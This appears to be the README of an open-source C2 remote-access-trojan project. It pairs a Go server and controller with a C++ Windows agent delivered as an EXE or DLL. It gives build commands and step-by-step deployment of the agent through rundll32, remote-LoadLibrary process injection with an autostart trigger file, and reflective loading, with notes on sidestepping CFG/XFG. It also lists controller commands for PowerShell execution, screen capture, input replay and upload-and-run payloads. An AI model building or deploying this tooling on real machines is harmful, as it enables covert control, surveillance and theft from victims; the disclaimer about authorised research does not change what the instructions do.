# C2 远控系统（rat/c2）

> **⚠️ 免责声明**
>
> 本项目**仅供安全研究、教学与已获明确授权的测试**使用。
> **严禁**将其用于任何未授权的入侵、控制、监听或数据窃取等非法用途。
> 使用者须自行确保行为合法合规，并**独立承担由此产生的一切后果与法律责任**；
> 作者不对任何使用、滥用或由此造成的损害负责，亦不提供任何形式的担保。

基于《ARCHITECTURE.md》架构设计计划书实现的可扩展 C2 远控系统。

- **客户端**：C++（Windows；同一套 core 源码出 **EXE 与 DLL 两种产物**，见下）
- **服务端**：Go（C2 中转/管理服务器）
- **控制端**：Go CLI（`ratctl`）+ C++ GUI（`im_ctl`）+ C++ 轻量查看器（`viewer`）
- **协议**：自定义二进制（20B 固定头 + 分模块指令码），AES-256-GCM 加密（PSK→HKDF 派生）
- **当前状态**：核心通信 + beacon/TCP 双信道 + 屏幕流/输入回放 + 截屏 + **payload 上传执行** +
  ratctl 命令补全 + viewer 查看器 + **RatAgent 的 DLL 形态（rundll32 / LoadLibrary / 注入）** +
  **反射加载实测**（外部 RfUdrl 出 PIC，`tools/runpic` 执行）
  （详见 `docs/DESIGN.md`、`docs/PROGRESS.md`）

## 目录结构

```
c2/
├── docs/protocol.md           # 协议规范 v1（两端唯一契约；§10 为 payload 上传）
├── internal/protocol/         # Go 共享协议层（头编解码 + AES-GCM/HKDF + 向量单测）
│   └── testdata/vectors.json  # 测试向量（Go/C++ 交叉验证）
├── cmd/genvectors/            # 测试向量生成器（go run ./cmd/genvectors）
├── server/                    # Go C2 服务器
│   ├── cmd/c2server/          # 4444 会话/转发、8080 beacon、4445 屏幕流中继
│   └── internal/session/      # 会话注册表（离线/回收）
├── ctl/                       # Go CLI
│   └── cmd/ratctl/            # 交互式 shell（会话/系统/截屏/远控/payload）
├── client/                    # C++ Agent（VS 解决方案：EXE + DLL 两个工程）
│   ├── RatAgent.sln
│   ├── RatAgent.vcxproj       # → RatAgent.exe（控制台形态）
│   ├── RatAgentDll.vcxproj    # → RatAgent.dll（rundll32 / 宿主 / 注入；静态 CRT）
│   └── core/                  # protocol/crypto/net/session/screen/cmd_dispatch
│                              # + agent_runtime(共用运行核心) / agent_dll(导出) / main(EXE 入口)
├── viewer/                    # C++ Win32 远控查看器（独立 CMake 工程）
├── im_ctl/                    # C++ ImGui 控制端
├── tools/runpic/              # PIC blob 执行器（反射加载验证 harness，配合外部 loader）
└── scripts/                   # e2e_m1~m4 + e2e_rdll + ctl_stream_probe
```

## 构建

**Go**（go 1.25+）：

```
go build -o bin/c2server.exe ./server/cmd/c2server
go build -o bin/ratctl.exe    ./ctl/cmd/ratctl
go test ./...                 # 协议单测（含测试向量验证）
```

**C++ Agent**（VS2022/18，v145 工具集）：用 VS 打开 `client/RatAgent.sln`（含两个工程），
或命令行分别生成：

```
MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current/Bin/amd64/MSBuild.exe"
"%MSBUILD%" client/RatAgent.vcxproj    -p:Configuration=Debug -p:Platform=x64   # → RatAgent.exe
"%MSBUILD%" client/RatAgentDll.vcxproj -p:Configuration=Debug -p:Platform=x64   # → RatAgent.dll
```

> Debug / Release **都是静态 CRT `/MT`**（`dumpbin /dependents` 只有系统 DLL），Release 体积更小
> （约 375 KB vs 1.9 MB），反射加载验证用的是 Release。指定 `-p:OutDir=` 时 Debug/Release 建议分目录。

产物：`client/x64/Debug/RatAgent.exe` 与 `client/x64/Debug/RatAgent.dll`。

> 受限环境（无 GUI/沙箱会话）下，既有 VS 输出目录可能不可写，改用工作区内新目录：
> `-p:IntDir=<repo>/build/agent/obj/ -p:OutDir=<repo>/build/agent/bin/`，
> 并给 Go 设置 `GOCACHE=<repo>/.gocache`、输出到 `build/bin/`。

### Agent 两种形态与适用场景

| 形态 | 入口 | 适用场景 | 身份/日志位置 |
|---|---|---|---|
| `RatAgent.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `agent.id`；stdout |
| `RatAgent.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其他程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\agent.id` + `agent.log`（可用 `id=`/`log=` 覆盖） |

DLL 的三种用法（都支持 `-tcp` 切长连接；默认 beacon `127.0.0.1:8080`、轮询 5s）：

```
:: 1) rundll32（Start 阻塞驻留，保证进程存活；Stop 可在另一个进程里触发跨进程停止事件）
rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5
rundll32 RatAgent.dll,Stop  id=<agent.id 路径或 32 位 hex>

:: 2) 自己的加载器 / 宿主（同进程启停，可 FreeLibrary 卸载）
LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → StopAgent()

:: 3) 注入（远程 LoadLibrary + 触发器自启动）
::    先写好 %TEMP%\RatAgent\autostart.args（内容 = 参数串），再让目标进程远程 LoadLibraryW 本 DLL；
::    DllMain 检测到触发器即在自建线程上启动；删除该文件即关闭自启动。

:: 4) 反射加载 / 其它没有参数通道的宿主（不落盘即自启）
::    在加载进程的环境里设 RAT_AUTOSTART_DEFAULT=1，DllMain 后按**内置默认配置**自启
::    （beacon 127.0.0.1:8080、轮询 5s；agent.id/日志落 %LOCALAPPDATA%\RatAgent\）。
::    该开关**默认关闭**：不设置时行为与以前完全一致（rundll32 Stop / 宿主 StartAgent
::    不会被抢跑）；若同时存在 autostart.args，仍以文件里的参数为准。
```

> **为什么注入要这样**：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"
> （表现为 `0xC0000409`/`__fastfail`），但远程 `LoadLibraryW`（kernel32 地址）仍然可用。
> 因此推荐"远程加载 + 触发器自启动"，而不是远程直接调用导出函数。
>
> **手动映射（reflective load）契约**：本 DLL 用静态 CRT（`/MT`，无 VC 运行库 DLL 依赖），
> **必须先调用入口点**（`DllMainCRTStartup`，参数 `DLL_PROCESS_ATTACH`）让 CRT 完成初始化，
> 之后才能调用导出；不依赖 `GetModuleFileName`/CWD/TLS，故映射后仍可用（`id=`/`log=` 可指定路径）。

**viewer**（C++ Win32，独立 CMake 工程）：

```
cmake -S viewer -B viewer/build
cmake --build viewer/build --config Debug      # 产物 viewer/build/bin/viewer.exe
```

**im_ctl**（C++ ImGui 控制端，可选）：

```
cmake -S im_ctl -B im_ctl/build
cmake --build im_ctl/build --config Debug
```

> 本仓库**不托管** `im_ctl/external/`（imgui / glad / glfw 第三方源码，且 imgui 自带独立
> `.git`，见 `.gitignore`）。要构建 im_ctl，请先自行获取：
> `imgui`（含 `backends/`）、`glad`（含 `src/glad.c`）、`glfw`（含 `lib-vc2026/glfw3.lib`）
> 放到 `im_ctl/external/` 下，或改用 git submodule。viewer 不依赖这些，可直接构建。

**runpic**（PIC blob 执行器，反射加载验证用）：

```
cmake -S tools/runpic -B build/runpic
cmake --build build/runpic --config Release    # 产物 build/runpic/bin/runpic.exe
```

> 用法：`runpic.exe <pic.bin> [--hold <秒>]`。它只负责把 PIC 跑起来（RWX 映射 +
> `CreateThread` 进偏移 0 的 `go()`），加载逻辑在 PIC 内部（如外部 RfUdrl loader）；
> 详见 `docs/PROGRESS.md` §8.5 与 `scripts/e2e_rdll.py`。

## 运行与联调

1. 启动 C2：`./bin/c2server.exe`（监听 4444 + 4445 + 8080，PSK 编译期内置）
2. 启动 Agent（三选一）：
   - beacon（默认）：`RatAgent.exe 127.0.0.1 8080 -s 5`
   - TCP 长连接：`RatAgent.exe 127.0.0.1 4444 -tcp`
   - DLL 形态：`rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5`（详见上文"Agent 两种形态"）
   - `--selftest` 可单独跑加密自检后退出
3. 控制端：`./bin/ratctl.exe`，交互式命令：

```
sessions                          列出在线 Agent
use <agent_id> / back             切换目标 Agent（支持前缀匹配）
session <agent_id> / kill <id>    会话详情 / 踢下线
sysinfo / exec <powershell>       系统信息 / 执行命令
screenshot [id] <file>            远程截屏存盘（JPEG）
screen [id] [fps] [quality] [scale]   拉起 viewer 查看/操作远程屏幕
stop                              停止当前 Agent 的屏幕流
payload <file> [name] [--args <参数>] 上传二进制 payload 并执行
```

4. 自动验收：`python scripts/e2e_m3.py`（beacon + ratctl）、`python scripts/e2e_m4.py`（屏幕流）、
   `python scripts/e2e_rdll.py`（反射加载：需先有 `build/e2e/out.bin`，见 `docs/PROGRESS.md` §8.5）

## 协议要点

- 数据包：`magic(0x5A5A) + version + flags + seq + timestamp + cmd + plugin + status + payload_len + payload`
- 加密：payload 用 AES-256-GCM（12B 随机 nonce），头部明文；密钥 = `HKDF-SHA256(PSK, client_nonce||server_nonce, "rat-v1")`
- 指令码分段：`0x0` 核心 / `0x1` 远程控制 / `0x2` 文件 / `0x3` 系统 / `0x4` 管理（详见 `docs/protocol.md`）
- 已实现业务指令：`0x1001` 截屏、`0x1002` 屏幕流、`0x3001` 系统信息、`0x3008` PowerShell、`0x3009` payload

## 路线图

- **M1 ✅** 协议 + 核心通信（握手/心跳/会话/离线判定）
- **M2 ✅** beacon 信道 + 命令分发（SYS_INFO/EXEC_PS）
- **M3 ✅** 屏幕流 + 输入回放（4445）+ 截屏 + payload 上传执行 + ratctl 补全 + viewer
- **M3.5 ✅** Agent 双产物（EXE/DLL）+ 可停止/可卸载 + 注入自启动触发器
- **M4** 插件框架（`plugin_api.h` + 加载器）、文件管理、进程/服务/注册表、多 CLI、打包与文档
